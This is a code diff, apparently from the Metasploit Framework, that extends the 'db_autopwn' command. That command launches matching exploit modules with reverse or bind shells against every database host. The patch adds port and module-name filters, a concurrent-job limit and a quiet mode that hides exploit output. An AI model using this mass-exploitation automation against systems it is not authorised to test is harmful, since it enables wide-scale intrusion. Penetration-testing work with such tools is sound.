@@ -16,7 +16,8 @@ module Db
 		PWN_PORT = 2**2
 		PWN_EXPL = 2**3
 		PWN_SING = 2**4
-			
+		PWN_SLNT = 2**5
+		
 		#
 		# The dispatcher's name.
 		#
@@ -110,6 +111,30 @@ module Db
 			print_status("Time: #{note.created} Note: host=#{note.host.address} type=#{note.ntype} data=#{note.data}")
 		end
 		
+		
+		def parse_port_range(desc)
+			res = []
+			desc.split(",").each do |r|
+				s,e = r.split("-")
+				e ||= s
+				s = s.to_i
+				e = e.to_i
+				
+				if(e < s)
+					t = s
+					s = e
+					e = t
+				end
+				
+				s.to_i.upto(e.to_i) do |i|
+					next if i == 0
+					res << i
+				end
+			end
+			
+			res
+		end
+		
 		#
 		# A shotgun approach to network-wide exploitation
 		#
@@ -120,6 +145,11 @@ module Db
 			rcnt  = 0
 			mode  = 0
 			code  = :bind
+			mjob  = 5
+			regx  = nil
+			
+			port_inc = []
+			port_exc = []
 			
 			targ_inc = []
 			targ_exc = []
@@ -137,7 +167,11 @@ module Db
 				when '-e'
 					mode |= PWN_EXPL
 				when '-s'
-					mode |= PWN_SING					
+					mode |= PWN_SING
+				when '-q'
+					mode |= PWN_SLNT
+				when '-j'
+					mjob = args.shift.to_i
 				when '-r'
 					code = :conn
 				when '-b'
@@ -146,19 +180,28 @@ module Db
 					targ_inc << OptAddressRange.new('TEMPRANGE', [ true, '' ]).normalize(args.shift)
 				when '-X'
 					targ_exc << OptAddressRange.new('TEMPRANGE', [ true, '' ]).normalize(args.shift)
+				when '-PI'
+					port_inc = parse_port_range(args.shift)
+				when '-PX'
+					port_exc = parse_port_range(args.shift)
+				when '-m'
+					regx = args.shift
 				when '-h'
 					print_status("Usage: db_autopwn [options]")
-					print_line("\t-h         Display this help text")
-					print_line("\t-t         Show all matching exploit modules")
-					print_line("\t-x         Select modules based on vulnerability references")
-					print_line("\t-p         Select modules based on open ports")
-					print_line("\t-e         Launch exploits against all matched targets")
-					print_line("\t-s         Only obtain a single shell per target system (NON-FUNCTIONAL)")
-					print_line("\t-r         Use a reverse connect shell")
-					print_line("\t-b         Use a bind shell on a random port")
-					print_line("\t-I [range] Only exploit hosts inside this range")
-					print_line("\t-X [range] Always exclude hosts inside this range")
-					
+					print_line("\t-h          Display this help text")
+					print_line("\t-t          Show all matching exploit modules")
+					print_line("\t-x          Select modules based on vulnerability references")
+					print_line("\t-p          Select modules based on open ports")
+					print_line("\t-e          Launch exploits against all matched targets")
+#					print_line("\t-s          Only obtain a single shell per target system (NON-FUNCTIONAL)")
+					print_line("\t-r          Use a reverse connect shell")
+					print_line("\t-b          Use a bind shell on a random port")
+					print_line("\t-q          Disbale exploit module output")
+					print_line("\t-I  [range] Only exploit hosts inside this range")
+					print_line("\t-X  [range] Always exclude hosts inside this range")
+					print_line("\t-PI [range] Only exploit hosts with these ports open")
+					print_line("\t-PX [range] Always exclude hosts with these ports open")
+					print_line("\t-m  [regex] Only run modules whose name matches the regex")
 					print_line("")
 					return
 				end
@@ -191,6 +234,10 @@ module Db
 									xhost = serv.host.address
 									next if (targ_inc.length > 0 and not range_include?(targ_inc, xhost))
 									next if (targ_exc.length > 0 and range_include?(targ_exc, xhost))
+									next if (port_inc.length > 0 and not port_inc.include?(serv.port.to_i))
+									next if (port_exc.length > 0 and port_exc.include?(serv.port.to_i))
+									next if (regx and n !~ /#{regx}/)
+									
 									matches[[xport,xprot,xhost,mtype[1]+'/'+n]]=true
 								end
 							end
@@ -210,7 +257,12 @@ module Db
 								xprot = serv.proto
 								xhost = serv.host.address
 								next if (targ_inc.length > 0 and not range_include?(targ_inc, xhost))
-								next if (targ_exc.length > 0 and range_include?(targ_exc, xhost))								
+								next if (targ_exc.length > 0 and range_include?(targ_exc, xhost))
+							
+								next if (port_inc.length > 0 and not port_inc.include?(serv.port.to_i))
+								next if (port_exc.length > 0 and port_exc.include?(serv.port.to_i))
+								next if (regx and n !~ /#{regx}/)
+										
 								matches[[xport,xprot,xhost,mtype[1]+'/'+n]]=true
 							end
 						end
@@ -223,8 +275,10 @@ module Db
 				print_status("Analysis completed in #{(Time.now.to_f - stamp).to_s} seconds (#{vcnt.to_s} vulns / #{rcnt.to_s} refs)")
 			end
 			
+
 			idx = 0
 			matches.each_key do |xref|
+			
 				idx += 1
 				
 				begin
@@ -263,33 +317,50 @@ module Db
 							end
 						end
 						
+						
+						if(framework.jobs.keys.length >= mjob)
+							print_status("Job limit reached, waiting on modules to finish...")
+							while(framework.jobs.keys.length >= mjob)
+								select(nil, nil, nil, 0.25)
+							end
+						end
+						
+						
 						next if not mod.autofilter()
 
-						print_status("Launching #{xref[3]} (#{idx.to_s}/#{matches.length.to_s}) against #{xref[2].to_s}:#{mod.datastore['RPORT'].to_s}...")
+						print_status("(#{idx.to_s}/#{matches.length.to_s}): Launching #{xref[3]} against #{xref[2].to_s}:#{mod.datastore['RPORT'].to_s}...")
 
+						
 						begin
+							inp = (mode & PWN_SLNT != 0) ? nil : driver.input
+							out = (mode & PWN_SLNT != 0) ? nil : driver.output
+						
 							case mod.type
 							when MODULE_EXPLOIT
 								session = mod.exploit_simple(
 									'Payload'        => mod.datastore['PAYLOAD'],
-									'LocalInput'     => driver.input,
-									'LocalOutput'    => driver.output,
+									'LocalInput'     => inp,
+									'LocalOutput'    => out,
 									'RunAsJob'       => true)
 							when MODULE_AUX
 								session = mod.run_simple(
-									'LocalInput'     => driver.input,
-									'LocalOutput'    => driver.output,
+									'LocalInput'     => inp,
+									'LocalOutput'    => out,
 									'RunAsJob'       => true)			
 							end
+						rescue ::Interrupt
+							raise $!
 						rescue ::Exception
-							print_status(" >> Exception during launch from #{xref[3]}: #{$!.to_s}")
+							print_status(" >> autopwn exception during launch from #{xref[3]}: #{$!.to_s} ")
 						end
 					end
-					
+				
+				rescue ::Interrupt
+					raise $!
 				rescue ::Exception
-					print_status(" >> Exception from #{xref[3]}: #{$!.to_s}")
+					print_status(" >> autopwn exception from #{xref[3]}: #{$!.to_s} #{$!.backtrace}")
 				end
-			end	
+			end
 
 		# EOM
 		end
